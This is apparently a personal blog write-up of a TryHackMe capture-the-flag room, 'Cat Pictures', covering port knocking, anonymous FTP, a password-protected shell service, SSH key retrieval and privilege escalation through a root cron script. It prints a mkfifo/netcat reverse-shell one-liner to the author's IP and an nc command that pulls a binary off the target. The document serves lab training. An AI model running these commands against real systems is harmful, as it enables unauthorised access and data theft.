## Cat Pictures
*I made a forum where you can post cute cat pictures!*

Easy rated. This is [Cat Pictures](https://tryhackme.com/room/catpictures) from THM. Ratings are weird; I did [Linux Server Forensics](https://tryhackme.com/room/linuxserverforensics) the other day which is Medium rated; I'm not going to bother writing it up because it was so straightforward. Anyway. This one sounds like it might be a file upload vulnerability or something? Turns out it's not ... 

## Ports
The description sounds like a web challenge; what do we get?

SSH, an unknown service on port 4420, and an HTTP proxy on 8080. Guess that last one is our target, but first let's check 4420.

## 4420
{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# nc 10.10.137.126 4420                                           
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
asd
Invalid password...
Connection Closed
{% endhighlight %}

I guess we can always bruteforce it if we have to.

## 8080
The homepage for the website is a bulletin board, and there is a link to one forum topic. If we go there, we get this in the post:

>Post cat pictures here!

POST ALL YOUR CAT PICTURES HERE  
Knock knock! Magic numbers: 1111, 2222, 3333, 4444

Well, we should knock then:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# knock 10.10.137.126 1111 2222 3333 4444
                                     
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# rustscan -a 10.10.137.126 --ulimit 5000 -b 2000

{% endhighlight %}

It seems we now have FTP.

## FTP
The FTP is anonymous login only and we cannot PUT. There is a single file we can download, which has a password in it. With that, it's back to Port 4420.

## 4420, again
{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# nc 10.10.137.126 4420                                                               

INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c

{% endhighlight %}

We have a limited shell. Enumerating finds a (binary) file called *runme*, but it won't run in the limited shell. I get a reverse shell:

``
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.10.123 1234 >/tmp/f
``

and I can run the binary; it wants a password. However, the password is not the one we already have. I exfil the file with nc:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# nc -nvlp 1234                                                                       

listening on [any] 1234 ...
connect to [10.9.10.123] from (UNKNOWN) [10.10.137.126] 49106
/bin/sh: 0: can't access tty; job control turned off
# cd /home/catlover
# nc 10.9.10.123 1235 < runme
{% endhighlight %}

And a listener:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# nc -l -p 1235 > runme         
{% endhighlight %}

Once I get the file, strings is all that's required:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# strings runme                               
/lib64/ld-linux-x86-64.so.2
__gmon_start__
# etc
rebecca
Please enter yout password: 
Welcome, catlover! SSH key transfer queued! 
touch /tmp/gibmethesshkey
Access Denied
# more etc
{% endhighlight %}

So let's do that:

{% highlight shell %}
# ./runme
Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued! 
{% endhighlight %}

## SSH
The key is written to /home/catlover/id_rsa and once we have it we can SSH in:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# nano id_rsa                                                                               
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# chmod 600 id_rsa        
                                                     
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/catpictures]
â””â”€# ssh -i id_rsa catlover@10.10.137.126

And at this point we are root in a Docker container and we can get Flag 1.

## Root, but actually
The root part isn't a traditional Docker container escape. There is a root script running on a cron job, and it runs in the host. 

{% highlight shell %}

We can edit it, so I just add a bash reverse shell line and wait a minute:

This was pretty pure CTF but I still enjoyed it. THM haven't had much interesting content lately so this was okay. I've been working on their Autopsy room which is also kind of interesting so I'll have something to say about that soon.
